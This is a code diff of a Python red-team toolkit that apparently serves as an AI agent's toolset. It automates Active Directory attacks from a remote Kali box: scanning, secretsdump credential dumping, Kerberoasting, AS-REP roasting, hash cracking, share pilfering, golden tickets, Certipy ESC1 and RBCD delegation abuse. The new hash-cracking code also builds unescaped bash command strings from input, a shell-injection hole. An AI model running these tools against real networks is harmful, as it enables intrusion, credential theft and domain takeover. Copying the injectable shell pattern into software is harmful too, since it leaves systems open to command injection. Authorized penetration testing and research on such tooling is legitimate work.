@@ -2,12 +2,11 @@
 
 This module provides toolsets for network enumeration, credential harvesting,
 password cracking, share pilfering, and golden ticket generation.
+
+All tools execute commands remotely on the Kali attack box via AWS SSM.
 """
 
 import logging
-import os
-import subprocess
-import tempfile
 import time
 from datetime import datetime, timezone
 from typing import Any
@@ -24,8 +23,23 @@ from ares.core.models import (
     TimelineEvent,
     User,
 )
+from ares.core.remote import run_remote
 
 logger = logging.getLogger(__name__)
+
+
+def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int]:
+    """Execute a command on the remote Kali attack box.
+
+    Args:
+        cmd: Command as list of arguments
+        timeout_seconds: Maximum execution time
+
+    Returns:
+        Tuple of (stdout, stderr, return_code)
+    """
+    result = run_remote(cmd, timeout_seconds=timeout_seconds)
+    return result.stdout, result.stderr, result.return_code
 
 
 class NetworkEnumerationTools(Toolset):
@@ -58,15 +72,15 @@ class NetworkEnumerationTools(Toolset):
             >>> result = nmap_scan("192.168.1.2")
             >>> result = nmap_scan("192.168.1.2 192.168.1.3 192.168.1.4")
         """
-        cmd = ["nmap", "-T4", "-sS", "-sV", "--open"] + target.split(" ")
+        cmd = ["nmap", "-T4", "-sV", "--open"] + target.split(" ")
 
         try:
             logger.info(f"[*] Scanning targets: {target}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=300)
 
-            if result.returncode != 0:
-                logger.error(f"[!] Nmap scan failed: {result.stderr}")
-                return result.stderr
+            if returncode != 0:
+                logger.error(f"[!] Nmap scan failed: {stderr}")
+                return stderr or f"Nmap scan failed with code {returncode}"
 
             logger.info(f"[*] Nmap scan completed for target {target}")
 
@@ -75,11 +89,8 @@ class NetworkEnumerationTools(Toolset):
                 for ip in target.split():
                     self.state.queried_hosts.add(ip)
 
-            return result.stdout
+            return stdout
 
-        except subprocess.TimeoutExpired:
-            logger.error("Nmap scan timed out after 5 minutes")
-            return "Nmap scan timed out after 5 minutes"
         except Exception as e:
             logger.error(f"Scan failed: {e!s}")
             return f"Scan failed: {e!s}"
@@ -118,15 +129,13 @@ class NetworkEnumerationTools(Toolset):
 
             cmd.append("--users")
 
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
             logger.info(
                 f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
             )
 
-            return result.stdout
+            return stdout or stderr
 
-        except subprocess.TimeoutExpired:
-            return f"User enumeration timed out for {target}"
         except Exception as e:
             logger.error(f"User enumeration failed: {e}")
             return f"User enumeration failed for {target}: {e}"
@@ -165,13 +174,11 @@ class NetworkEnumerationTools(Toolset):
 
             cmd.append("--shares")
 
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
             logger.info(f"[*] Share enumeration completed for {target}")
 
-            return result.stdout
+            return stdout or stderr
 
-        except subprocess.TimeoutExpired:
-            return f"Share enumeration timed out for {target}"
         except Exception as e:
             logger.error(f"Share enumeration failed: {e}")
             return f"Share enumeration failed for {target}: {e}"
@@ -221,7 +228,7 @@ class CredentialHarvestingTools(Toolset):
             >>> secretsdump("192.168.1.100", "Administrator", hash="aad3b4...", domain="DOMAIN")
             >>> secretsdump("domain.local", "Administrator", no_pass=True)  # golden ticket
         """
-        cmd = ["/usr/bin/impacket-secretsdump"]
+        cmd = ["impacket-secretsdump"]
 
         if password and domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -241,27 +248,18 @@ class CredentialHarvestingTools(Toolset):
 
         cmd.append(target_string)
 
+        # For golden ticket auth, set KRB5CCNAME in the command
+        if no_pass:
+            cmd = ["env", "KRB5CCNAME=Administrator.ccache"] + cmd
+
         try:
             logger.info(f"[*] Running secretsdump on {target} with {username}")
 
-            env = os.environ.copy() if no_pass else None
-            if no_pass and env is not None:
-                env["KRB5CCNAME"] = "Administrator.ccache"
-
-            result = subprocess.run(
-                cmd,
-                check=False,
-                capture_output=True,
-                text=True,
-                timeout=timeout_minutes * 60,
-                env=env,
-            )
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=timeout_minutes * 60)
 
             logger.info(f"[*] Secretsdump completed for {target}")
-            return result.stdout
+            return stdout or stderr or f"Secretsdump returned code {returncode}"
 
-        except subprocess.TimeoutExpired:
-            return "[!] Secretsdump timed out"
         except Exception as e:
             return f"[!] Secretsdump error: {e}"
 
@@ -293,7 +291,7 @@ class CredentialHarvestingTools(Toolset):
             >>> kerberoast("example.local", "user", "pass", "192.168.1.100")
         """
         cmd = [
-            "/usr/bin/impacket-GetUserSPNs",
+            "impacket-GetUserSPNs",
             f"{domain}/{username}:{password}",
             "-dc-ip",
             dc_ip,
@@ -302,11 +300,9 @@ class CredentialHarvestingTools(Toolset):
 
         try:
             logger.info(f"[*] Kerberoasting {domain} using {username}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
-            return result.stdout
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
+            return stdout or stderr
 
-        except subprocess.TimeoutExpired:
-            return "Error: Kerberoasting timed out"
         except Exception as e:
             return f"Kerberoasting failed: {e!s}"
 
@@ -338,7 +334,7 @@ class CredentialHarvestingTools(Toolset):
             >>> asrep_roast("example.local", "user", "pass", "192.168.1.100")
         """
         cmd = [
-            "/usr/bin/impacket-GetNPUsers",
+            "impacket-GetNPUsers",
             f"{domain}/{username}:{password}",
             "-dc-ip",
             dc_ip,
@@ -347,11 +343,9 @@ class CredentialHarvestingTools(Toolset):
 
         try:
             logger.info(f"[*] AS-REP roasting {domain} using {username}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
-            return result.stdout
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
+            return stdout or stderr
 
-        except subprocess.TimeoutExpired:
-            return "Error: AS-REP roasting timed out"
         except Exception as e:
             return f"AS-REP roasting failed: {e!s}"
 
@@ -397,19 +391,15 @@ class CredentialHarvestingTools(Toolset):
 
             cmd.extend(["-x", "whoami"])
 
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
 
-            output = ""
-            if result.stdout:
-                output += result.stdout
-            if result.stderr:
-                output += "\n" + result.stderr if output else result.stderr
+            output = stdout
+            if stderr:
+                output += "\n" + stderr if output else stderr
 
             logger.info(f"[*] Domain admin check completed for {targets}")
             return output
 
-        except subprocess.TimeoutExpired:
-            return f"Domain admin checker timed out for {targets}"
         except Exception as e:
             logger.error(f"Domain admin checker failed: {e}")
             return f"Domain admin checker failed: {e}"
@@ -458,57 +448,30 @@ class CrackingTools(Toolset):
         """
         output = "[*] Starting hashcat...\n"
 
+        # Create hash file remotely and run hashcat
+        hash_file_path = f"/tmp/hash_{time.time()}.hash"  # noqa: S108  # nosec B108
+
         try:
-            with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
-                hash_file.write(hash_value)
-                hash_file_path = hash_file.name
+            # Write hash to remote file and run hashcat
+            cmd = f"""
+echo '{hash_value}' > {hash_file_path}
+hashcat -m {hashcat_mode} -a 0 {hash_file_path} {wordlist_path} --runtime {max_time_minutes * 60} --force 2>&1 || true
+hashcat -m {hashcat_mode} {hash_file_path} --show 2>&1
+rm -f {hash_file_path}
+"""
+            stdout, stderr, _ = _run_tool(
+                ["bash", "-c", cmd],
+                timeout_seconds=(max_time_minutes * 60) + 60,
+            )
 
-            try:
-                cmd = [
-                    "hashcat",
-                    "-m",
-                    str(hashcat_mode),
-                    "-a",
-                    "0",
-                    hash_file_path,
-                    wordlist_path,
-                    "--runtime",
-                    str(max_time_minutes * 60),
-                    "--force",
-                ]
+            if stdout and ":" in stdout:
+                output += "\n✓ CRACKED PASSWORDS:\n" + stdout
+                logger.info("[+] Hashcat successfully cracked hash")
+            else:
+                output += "\n✗ No passwords cracked\n" + (stdout or stderr)
 
-                _result = subprocess.run(
-                    cmd,
-                    check=False,
-                    capture_output=True,
-                    text=True,
-                    timeout=(max_time_minutes * 60) + 30,
-                )
+            return output
 
-                show_cmd = ["hashcat", "-m", str(hashcat_mode), hash_file_path, "--show"]
-
-                show_result = subprocess.run(
-                    show_cmd,
-                    check=False,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
-                )
-
-                if show_result.stdout.strip():
-                    output += "\n✓ CRACKED PASSWORDS:\n" + show_result.stdout
-                    logger.info("[+] Hashcat successfully cracked hash")
-                else:
-                    output += "\n✗ No passwords cracked"
-
-                return output
-
-            finally:
-                if os.path.exists(hash_file_path):
-                    os.unlink(hash_file_path)
-
-        except subprocess.TimeoutExpired:
-            return output + "\nError: Hashcat timed out"
         except Exception as e:
             return output + f"\nError: {e!s}"
 
@@ -546,65 +509,30 @@ class CrackingTools(Toolset):
         """
         output = "[*] Starting John the Ripper...\n"
 
+        hash_file_path = f"/tmp/john_hash_{time.time()}.hash"  # noqa: S108  # nosec B108
+        session_name = f"john_session_{int(time.time())}"
+
         try:
-            with tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as hash_file:
-                hash_file.write(hash_value)
-                hash_file_path = hash_file.name
+            # Write hash to remote file and run john
+            cmd = f"""
+echo '{hash_value}' > {hash_file_path}
+john --wordlist={wordlist_path} --format={hash_format} {hash_file_path} --session={session_name} 2>&1 || true
+john --show --format={hash_format} {hash_file_path} 2>&1
+rm -f {hash_file_path} {session_name}.pot {session_name}.rec {session_name}.log
+"""
+            stdout, stderr, _ = _run_tool(
+                ["bash", "-c", cmd],
+                timeout_seconds=(max_time_minutes * 60) + 60,
+            )
 
-            try:
-                session_name = f"john_session_{int(time.time())}"
-                cmd = [
-                    "john",
-                    "--wordlist=" + wordlist_path,
-                    "--format=" + hash_format,
-                    hash_file_path,
-                    "--session=" + session_name,
-                ]
+            if stdout and ":" in stdout:
+                output += "\n✓ CRACKED PASSWORDS:\n" + stdout
+                logger.info("[+] John successfully cracked hash")
+            else:
+                output += "\n✗ No passwords cracked\n" + (stdout or stderr)
 
-                subprocess.run(
-                    cmd,
-                    check=False,
-                    capture_output=True,
-                    text=True,
-                    timeout=(max_time_minutes * 60) + 30,
-                )
+            return output
 
-                show_cmd = ["john", "--show", "--format=" + hash_format, hash_file_path]
-
-                show_result = subprocess.run(
-                    show_cmd,
-                    check=False,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
-                )
-
-                if show_result.stdout.strip():
-                    output += "\n✓ CRACKED PASSWORDS:\n" + show_result.stdout
-                    logger.info("[+] John successfully cracked hash")
-                else:
-                    output += "\n✗ No passwords cracked"
-
-                return output
-
-            finally:
-                if os.path.exists(hash_file_path):
-                    os.unlink(hash_file_path)
-
-                session_files = [
-                    f"{session_name}.pot",
-                    f"{session_name}.rec",
-                    f"{session_name}.log",
-                ]
-                for session_file in session_files:
-                    if os.path.exists(session_file):
-                        try:
-                            os.unlink(session_file)
-                        except Exception:
-                            pass
-
-        except subprocess.TimeoutExpired:
-            return output + "\nError: John the Ripper timed out"
         except Exception as e:
             return output + f"\nError: {e!s}"
 
@@ -658,17 +586,14 @@ class SharePilferingTools(Toolset):
             ]
 
             logger.info(f"[*] Enumerating files in {share_path}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=120)
 
-            if result.returncode != 0:
-                logger.error(f"[!] Failed to list files: {result.stderr}")
-                return f"Failed to list files: {result.stderr}"
+            if returncode != 0:
+                logger.error(f"[!] Failed to list files: {stderr}")
+                return f"Failed to list files: {stderr}"
 
-            return result.stdout
+            return stdout
 
-        except subprocess.TimeoutExpired:
-            logger.error(f"[!] File enumeration timed out for {share_path}")
-            return "File enumeration timed out"
         except Exception as e:
             logger.error(f"[!] Error during enumeration: {e!s}")
             return f"Error during enumeration: {e!s}"
@@ -719,13 +644,13 @@ class SharePilferingTools(Toolset):
             ]
 
             logger.info(f"[*] Downloading {file_path} from {share_path}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=60)
 
-            if result.returncode != 0:
-                logger.error(f"[!] Failed to download file: {result.stderr}")
-                return f"Failed to download file: {result.stderr}"
+            if returncode != 0:
+                logger.error(f"[!] Failed to download file: {stderr}")
+                return f"Failed to download file: {stderr}"
 
-            content = result.stdout
+            content = stdout
             logger.info(f"[+] Downloaded {len(content)} bytes from {file_path}")
 
             # Log that share was accessed
@@ -734,9 +659,6 @@ class SharePilferingTools(Toolset):
 
             return content
 
-        except subprocess.TimeoutExpired:
-            logger.error(f"[!] File download timed out for {file_path}")
-            return "File download timed out"
         except Exception as e:
             logger.error(f"[!] Error downloading file: {e!s}")
             return f"Error downloading file: {e!s}"
@@ -787,11 +709,9 @@ class GoldenTicketTools(Toolset):
             logger.info(f"[*] Getting SID for {domain} using {username}")
 
         try:
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
             logger.info(f"[*] SID lookup completed for {domain}")
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "Error: SID lookup timed out"
+            return stdout or stderr
         except Exception as e:
             return f"Error: {e!s}"
 
@@ -847,7 +767,7 @@ class GoldenTicketTools(Toolset):
         try:
             logger.info("[*] Generating golden ticket for Administrator")
             logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
 
             if self.state:
                 self.state.has_golden_ticket = True
@@ -862,9 +782,7 @@ class GoldenTicketTools(Toolset):
                 )
                 self.state.timeline.append(event)
 
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "Error: Golden ticket generation timed out"
+            return stdout or stderr
         except Exception as e:
             return f"Error: {e!s}"
 
@@ -925,13 +843,11 @@ class BloodHoundTools(Toolset):
 
         try:
             logger.info(f"[*] Running BloodHound collection for {domain}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=600)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=600)
 
             logger.info("[+] BloodHound collection completed")
-            return result.stdout + "\n" + result.stderr
+            return stdout + "\n" + (stderr or "")
 
-        except subprocess.TimeoutExpired:
-            return "BloodHound collection timed out after 10 minutes"
         except Exception as e:
             logger.error(f"BloodHound failed: {e}")
             return f"BloodHound failed: {e}"
@@ -993,15 +909,13 @@ class CertipyTools(Toolset):
 
         try:
             logger.info(f"[*] Enumerating ADCS for {domain}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=300)
 
-            if "ESC" in result.stdout:
+            if "ESC" in stdout:
                 logger.warning("[!] VULNERABLE CERTIFICATE TEMPLATES FOUND!")
 
-            return result.stdout + "\n" + result.stderr
+            return stdout + "\n" + (stderr or "")
 
-        except subprocess.TimeoutExpired:
-            return "Certipy enumeration timed out"
         except Exception as e:
             return f"Certipy enumeration failed: {e}"
 
@@ -1058,15 +972,13 @@ class CertipyTools(Toolset):
 
         try:
             logger.info(f"[*] Requesting certificate for {target_upn} via ESC1")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
 
-            if "saved" in result.stdout.lower():
+            if "saved" in stdout.lower():
                 logger.info("[+] Certificate obtained! Use certipy_auth next.")
 
-            return result.stdout + "\n" + result.stderr
+            return stdout + "\n" + (stderr or "")
 
-        except subprocess.TimeoutExpired:
-            return "Certificate request timed out"
         except Exception as e:
             return f"Certificate request failed: {e}"
 
@@ -1092,15 +1004,13 @@ class CertipyTools(Toolset):
 
         try:
             logger.info("[*] Authenticating with certificate")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
 
-            if "hash" in result.stdout.lower():
+            if "hash" in stdout.lower():
                 logger.info("[+] NTLM hash obtained! Run domain_admin_checker.")
 
-            return result.stdout + "\n" + result.stderr
+            return stdout + "\n" + (stderr or "")
 
-        except subprocess.TimeoutExpired:
-            return "Certificate authentication timed out"
         except Exception as e:
             return f"Certificate authentication failed: {e}"
 
@@ -1151,10 +1061,8 @@ class DelegationTools(Toolset):
 
         try:
             logger.info(f"[*] Searching for delegation in {domain}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "Delegation search timed out"
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            return stdout or stderr
         except Exception as e:
             return f"Delegation search failed: {e}"
 
@@ -1200,11 +1108,9 @@ class DelegationTools(Toolset):
 
         try:
             logger.info(f"[*] Adding computer account {computer_name}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=60)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
             logger.info(f"[+] Computer account {computer_name}$ created")
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "Computer account creation timed out"
+            return stdout or stderr
         except Exception as e:
             return f"Computer account creation failed: {e}"
 
@@ -1252,11 +1158,9 @@ class DelegationTools(Toolset):
 
         try:
             logger.info(f"[*] Configuring RBCD: {delegate_from} -> {delegate_to}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
             logger.info("[+] RBCD configured - use get_st next")
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "RBCD configuration timed out"
+            return stdout or stderr
         except Exception as e:
             return f"RBCD configuration failed: {e}"
 
@@ -1302,14 +1206,12 @@ class DelegationTools(Toolset):
 
         try:
             logger.info(f"[*] Requesting ST for {target_spn} as {impersonate_user}")
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
 
-            if ".ccache" in result.stdout:
+            if ".ccache" in stdout:
                 logger.info("[+] Ticket obtained! Export KRB5CCNAME and use secretsdump -k")
 
-            return result.stdout
-        except subprocess.TimeoutExpired:
-            return "Service ticket request timed out"
+            return stdout or stderr
         except Exception as e:
             return f"Service ticket request failed: {e}"
 
@@ -1449,11 +1351,67 @@ class RedTeamReportingTools(Toolset):
                 return f"✓ Recorded share: {share.name} on {share.host}"
 
             if finding_type == "admin_access":
+                details = data.get("details", "")
+
+                # Validate that this is actually a success, not an error being misreported
+                error_indicators = [
+                    "not found",
+                    "not available",
+                    "not installed",
+                    "not in path",
+                    "missing",
+                    "failed",
+                    "error",
+                    "cannot",
+                    "unable",
+                    "timed out",
+                    "timeout",
+                    "not properly configured",
+                    "command not found",
+                    "no such file",
+                    "permission denied",
+                ]
+                details_lower = details.lower()
+
+                for indicator in error_indicators:
+                    if indicator in details_lower:
+                        logger.warning(
+                            f"[!] Rejecting admin_access finding - details contain error indicator '{indicator}': {details[:200]}"
+                        )
+                        return (
+                            f"[!] REJECTED: Cannot record admin_access with error details. "
+                            f"The details contain '{indicator}' which indicates a failure, not success. "
+                            f"Only call record_finding('admin_access') when you have CONFIRMED admin access "
+                            f"(e.g., 'Pwn3d!' in netexec output, successful secretsdump, etc.). "
+                            f"If tools are missing or not working, troubleshoot the environment first."
+                        )
+
+                # Require some positive indicator of success
+                success_indicators = [
+                    "pwn3d",
+                    "admin",
+                    "success",
+                    "authenticated",
+                    "dumped",
+                    "obtained",
+                ]
+                has_success_indicator = any(ind in details_lower for ind in success_indicators)
+
+                if not has_success_indicator and len(details) > 0:
+                    logger.warning(
+                        f"[!] Admin access claim lacks success indicators: {details[:200]}"
+                    )
+                    return (
+                        "[!] REJECTED: admin_access finding should include evidence of success "
+                        "(e.g., 'Pwn3d!' output, successful authentication, dumped credentials). "
+                        "Provide specific details showing HOW admin access was confirmed."
+                    )
+
                 self.state.has_domain_admin = True
                 event = TimelineEvent(
                     id=f"evt-{len(self.state.timeline):04d}",
                     timestamp=datetime.now(timezone.utc),
-                    description=f"Domain admin access achieved: {data.get('details', '')}",
+                    description=f"Domain admin access achieved: {details}",
                     mitre_techniques=["T1078.002"],  # Domain Accounts
                     confidence=1.0,
                     source="domain_admin_checker",
